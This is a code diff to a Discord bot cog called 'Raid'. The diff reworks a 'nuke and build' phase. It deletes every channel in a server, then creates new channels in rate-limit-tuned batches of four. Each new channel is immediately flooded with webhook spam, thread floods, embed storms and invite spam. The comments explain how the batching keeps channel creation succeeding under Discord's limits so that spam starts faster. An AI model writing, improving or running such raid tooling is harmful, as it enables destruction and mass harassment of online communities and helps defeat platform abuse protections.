@@ -286,6 +286,13 @@ class Raid(commands.Cog):
 
     # ─────────────────────────────────────────────────────────────────────────
     # PHASE 01 + 03 + 04 + 05 + 06 + 13 — Nuke → Build → Webhook/Embed Army
+    #
+    # PIPELINE APPROACH: channels are created in batches of 4.
+    # As soon as each batch lands, the webhook army fires on those channels
+    # as background tasks — so spam starts flowing while new channels are
+    # still being created. Discord's guild channel-create rate limit is
+    # ~2-5 per second, so 4-at-a-time with a 1 s gap between batches is
+    # the sweet spot that keeps creates succeeding without blowing retries.
     # ─────────────────────────────────────────────────────────────────────────
     async def _phase_nuke_and_build(
         self,
@@ -301,45 +308,77 @@ class Raid(commands.Cog):
         bp = bot_state.bypass
         se = bot_state.stop_event
         try:
+            # ── Step 1: Delete every existing channel (each channel has its own
+            #            bucket so high concurrency is safe here)
             if nuke:
-                sem = asyncio.Semaphore(SEM_DELETE)
+                sem_del = asyncio.Semaphore(SEM_DELETE)
                 await asyncio.gather(
-                    *[self._delete_channel(ch, sem) for ch in originals],
+                    *[self._delete_channel(ch, sem_del) for ch in originals],
                     return_exceptions=True,
                 )
 
             if se.is_set():
                 return
 
-            fp = bp.fp
-            sem_c = asyncio.Semaphore(SEM_CREATE)
+            # ── Step 2: Create channels in batches of 4, flood each batch
+            #            immediately as background tasks so spam starts NOW
+            BATCH = 4
+            BATCH_PAUSE = 1.1   # seconds between batches — respects ~5/5s guild limit
 
-            results = await asyncio.gather(
-                *[self._create_category(guild, i, sem_c)  for i in range(NEW_CATEGORIES)],
-                *[self._create_text_ch(guild, i, sem_c)   for i in range(n_text)],
-                *[self._create_voice_ch(guild, i, sem_c)  for i in range(NEW_VOICE_CHANNELS)],
-                *[self._create_stage_ch(guild, i, sem_c)  for i in range(NEW_STAGE_CHANNELS)],
-                *[self._create_forum_ch(guild, i, sem_c)  for i in range(NEW_FORUM_CHANNELS)],
-                return_exceptions=True,
-            )
+            async def _create_and_flood(idx: int) -> None:
+                """Create one text channel then immediately start flooding it."""
+                sem1 = asyncio.Semaphore(1)
+                ch = await self._create_text_ch(guild, idx, sem1)
+                if ch and not se.is_set():
+                    bot_state.add_task(asyncio.create_task(
+                        self._webhook_army(ch, webhooks_per, msgs_per, embed_storm)
+                    ))
+                    bot_state.add_task(asyncio.create_task(
+                        self._thread_double_flood(ch, msgs_per)
+                    ))
+                    if invite_flood:
+                        bot_state.add_task(asyncio.create_task(self._create_invite(ch)))
 
-            new_text  = [r for r in results if isinstance(r, discord.TextChannel)]
-            new_voice = [r for r in results if isinstance(r, discord.VoiceChannel)]
+            # Fire text channel batches
+            for batch_start in range(0, n_text, BATCH):
+                if se.is_set():
+                    break
+                batch = range(batch_start, min(batch_start + BATCH, n_text))
+                await asyncio.gather(
+                    *[_create_and_flood(i) for i in batch],
+                    return_exceptions=True,
+                )
+                if batch_start + BATCH < n_text:
+                    await asyncio.sleep(BATCH_PAUSE)
 
-            if se.is_set():
-                return
+            # Fire voice channel batches
+            async def _create_vc(idx: int) -> None:
+                sem1 = asyncio.Semaphore(1)
+                ch = await self._create_voice_ch(guild, idx, sem1)
+                if ch and invite_flood and not se.is_set():
+                    bot_state.add_task(asyncio.create_task(self._create_invite(ch)))
 
-            flood_tasks = []
-            for ch in new_text:
-                flood_tasks.append(self._webhook_army(ch, webhooks_per, msgs_per, embed_storm))
-                flood_tasks.append(self._thread_double_flood(ch, msgs_per))
-                if invite_flood:
-                    flood_tasks.append(self._create_invite(ch))
-            for ch in new_voice:
-                if invite_flood:
-                    flood_tasks.append(self._create_invite(ch))
+            for batch_start in range(0, NEW_VOICE_CHANNELS, BATCH):
+                if se.is_set():
+                    break
+                batch = range(batch_start, min(batch_start + BATCH, NEW_VOICE_CHANNELS))
+                await asyncio.gather(
+                    *[_create_vc(i) for i in batch],
+                    return_exceptions=True,
+                )
+                await asyncio.sleep(BATCH_PAUSE)
 
-            await asyncio.gather(*flood_tasks, return_exceptions=True)
+            # Categories (best-effort, fail silently on rate-limited servers)
+            for i in range(0, NEW_CATEGORIES, BATCH):
+                if se.is_set():
+                    break
+                batch = range(i, min(i + BATCH, NEW_CATEGORIES))
+                sem_b = asyncio.Semaphore(BATCH)
+                await asyncio.gather(
+                    *[self._create_category(guild, j, sem_b) for j in batch],
+                    return_exceptions=True,
+                )
+                await asyncio.sleep(BATCH_PAUSE)
 
         except asyncio.CancelledError:
             pass
